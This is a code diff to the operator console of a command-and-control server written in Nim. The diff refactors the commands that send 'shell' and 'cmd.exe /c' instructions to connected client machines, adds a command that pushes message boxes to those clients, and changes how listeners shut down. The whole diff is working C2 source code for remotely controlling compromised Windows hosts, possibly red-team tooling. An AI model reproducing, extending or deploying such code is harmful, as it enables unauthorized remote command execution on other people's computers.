@@ -2,6 +2,7 @@ import asyncdispatch, asyncnet, threadpool, asyncfutures
 import strutils, terminal
 
 import listeners/[tcp]
+import communication
 
 import types, logging
 
@@ -17,13 +18,14 @@ proc procStdin*(server: C2Server) {.async.} =
       let args = input.split(" ")
       let argsn = len(args)
       let cmd = args[0]
+      let a_args = args[1..(argsn - 1)].join(" ")
 
       case cmd:
         of "help":
             echo "-- Navigation"
             echo "\texit\twhy would you ever exit?"
             echo "\tback\tgo back to main menu"
-            echo "\tswitch [id]\tswitch to a client"
+            echo "\tinteract [id]\tinteract with a client"
             echo "-- Listeners"
             echo "\tstartlistener [type] [..args]\tstart a listener"
             echo "\tlisteners\tshow a list of listeners"
@@ -33,6 +35,7 @@ proc procStdin*(server: C2Server) {.async.} =
             echo "\tinfo\tget info about a client"
             echo "\tshell\trun a shell command"
             echo "\tcmd\trun a cmd command ('cmd.exe /c')"
+            echo "\tmsgbox\tsend a message box"
         of "listeners":
             for tcpListener in server.tcpListeners:
                 infoLog @tcpListener
@@ -60,7 +63,7 @@ proc procStdin*(server: C2Server) {.async.} =
                 else:
                     stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
             infoLog $len(server.clients) & " clients currently connected"
-        of "switch":
+        of "interact":
             for client in server.clients:
                 if client.id == parseInt(args[1]):
                     handlingClient = client
@@ -69,29 +72,25 @@ proc procStdin*(server: C2Server) {.async.} =
         of "info":
             echo @handlingClient
         of "shell":
-            if handlingClient.listenerType == "tcp":
-                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
-                if tcpSocket.isNil():
-                    errorLog "Could not find TCP Socket for " & $handlingClient
-                else:
-                    await tcpSocket.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
-                    if server.clRespFuture[].isNil():
-                        server.clRespFuture[] = newFuture[void]()
-                    await server.clRespFuture[]
+            await handlingClient.sendShellCmd(a_args)
+            await handlingClient.awaitResponse()
         of "cmd":
-            if handlingClient.listenerType == "tcp":
-                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
-                if tcpSocket.isNil():
-                    errorLog "Could not find TCP Socket for " & $handlingClient
-                else:
-                    await tcpSocket.socket.send("CMD:cmd.exe /c " & args[1..(argsn - 1)].join(" ") & "\r\n")
-                    if server.clRespFuture[].isNil():
-                        server.clRespFuture[] = newFuture[void]()
-                    await server.clRespFuture[]
+            await handlingClient.sendShellCmd("cmd.exe /c " & a_args)
+            await handlingClient.awaitResponse()
+        of "msgbox":
+            if argsn >= 3:
+                let slashSplit = a_args.split("/")
+                await handlingClient.sendMsgBox(slashSplit[1].strip(), slashSplit[0].strip())
+            else:
+                echo "wrong usage. msgbox (title) / (caption)"
         of "back": 
             handlingClient = nil
         of "exit":
-            quit(0)
+            for tcpListener in server.tcpListeners:
+                tcpListener.running = false
+                tcpListener.socket.close()
+
+            # quit(0)
 
       prompt(handlingClient, server)
       messageFlowVar = spawn stdin.readLine()
